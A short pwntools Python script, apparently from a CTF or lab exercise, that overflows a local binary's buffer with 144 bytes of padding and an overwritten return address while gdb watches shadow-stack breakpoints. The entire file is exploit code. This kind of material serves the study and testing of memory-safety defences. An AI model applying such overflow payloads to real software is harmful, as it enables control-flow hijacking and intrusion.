from pwn import *

context.terminal = ["terminator", "-e"]
OFFSET = 144


p = process("./a.out")
e = ELF("./a.out")
gdb.attach(p, '''
b shstack_exit
b shstack_enter
c''')
sleep(2)
g = cyclic_gen()
payload = b"A"*OFFSET +p64(0x401170-8) + b"B"*1000
p.sendline(payload)
p.interactive()